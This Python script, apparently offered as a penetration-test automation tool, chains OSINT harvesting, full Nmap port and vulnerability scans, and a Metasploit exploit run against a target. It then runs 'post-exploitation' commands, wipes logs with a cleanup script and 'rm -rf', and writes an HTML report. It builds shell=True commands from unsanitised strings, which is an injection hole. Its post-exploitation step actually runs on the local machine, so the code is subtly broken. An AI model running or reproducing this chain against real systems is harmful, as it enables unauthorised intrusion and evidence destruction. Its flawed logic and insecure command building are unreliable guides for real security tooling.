import subprocess
import os
import json
import time
from datetime import datetime

def run_command(command):
    """Run a shell command and return the output."""
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, check=True)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return e.stderr.decode('utf-8')

def reconnaissance(target):
    """Perform reconnaissance using open-source intelligence (OSINT) techniques."""
    print(f"Starting reconnaissance on {target}")
    # Example: Using 'theHarvester' for domain reconnaissance
    command = f"theHarvester -d {target} -b all"
    output = run_command(command)
    save_results("reconnaissance", output)

def network_scanning(target):
    """Conduct network scanning to identify live hosts and open ports."""
    print(f"Starting network scanning on {target}")
    # Example: Using Nmap for network scanning
    command = f"nmap -sS -sV -O -p- {target}"
    output = run_command(command)
    save_results("network_scanning", output)

def vulnerability_scanning(target):
    """Perform vulnerability scanning to identify potential exploits."""
    print(f"Starting vulnerability scanning on {target}")
    # Example: Using Nmap with vulnerability scripts
    command = f"nmap --script vuln {target}"
    output = run_command(command)
    save_results("vulnerability_scanning", output)

def exploitation(target, service):
    """Attempt exploitation using known vulnerabilities or custom payloads."""
    print(f"Attempting exploitation on {target} for {service}")
    # Example: Using Metasploit Framework for exploitation
    command = f"msfconsole -q -x 'use exploit/{service}; set RHOST {target}; run; exit'"
    output = run_command(command)
    save_results("exploitation", output)

def post_exploitation():
    """Post-exploitation tasks: data exfiltration, lateral movement, privilege escalation."""
    print("Conducting post-exploitation activities")
    # Example: Collecting user information
    commands = [
        "whoami",
        "hostname",
        "ipconfig" if os.name == 'nt' else "ifconfig",
        "netstat -an"
    ]
    post_exploit_results = {}
    for cmd in commands:
        output = run_command(cmd)
        post_exploit_results[cmd] = output
    save_results("post_exploitation", post_exploit_results)

def cleanup():
    """Clean up any traces left by the penetration test."""
    print("Cleaning up traces")
    # Example: Clear logs or delete files
    commands = [
        "clear_logs.sh",  # Custom script to clear logs
        "rm -rf /tmp/exploit_files"
    ]
    for cmd in commands:
        run_command(cmd)

def save_results(phase, data):
    """Save the results of each phase to a JSON file."""
    filename = f"{phase}_results.json"
    with open(filename, 'w') as file:
        json.dump(data, file)
    print(f"Results saved to {filename}")

def generate_report():
    """Generate an HTML report summarizing the results of the penetration test."""
    report_filename = "penetration_test_report.html"
    phases = ["reconnaissance", "network_scanning", "vulnerability_scanning", "exploitation", "post_exploitation"]
    
    html_content = f"""
    <html>
    <head>
        <title>Penetration Test Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; }}
            h1 {{ color: #333; }}
            h2 {{ color: #555; }}
            pre {{ background-color: #f4f4f4; padding: 10px; border-radius: 5px; }}
            .phase {{ margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <h1>Penetration Test Report</h1>
        <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    """

    for phase in phases:
        filename = f"{phase}_results.json"
        if os.path.exists(filename):
            with open(filename, 'r') as file:
                data = json.load(file)
                html_content += f"<div class='phase'><h2>{phase.replace('_', ' ').title()}</h2><pre>{json.dumps(data, indent=4)}</pre></div>"

    html_content += """
    </body>
    </html>
    """

    with open(report_filename, 'w') as report_file:
        report_file.write(html_content)
    
    print(f"Report generated and saved to {report_filename}")

def main():
    target = "example.com"  # Target domain or IP
    service = "http/vnc_auth_bypass"  # Example service for exploitation

    reconnaissance(target)
    time.sleep(5)  # Adding delays to simulate real-world attacks
    network_scanning(target)
    time.sleep(5)
    vulnerability_scanning(target)
    time.sleep(5)
    exploitation(target, service)
    time.sleep(5)
    post_exploitation()
    time.sleep(5)
    cleanup()
    
    generate_report()  # Generate the report at the end of the penetration test

if __name__ == "__main__":
    main()
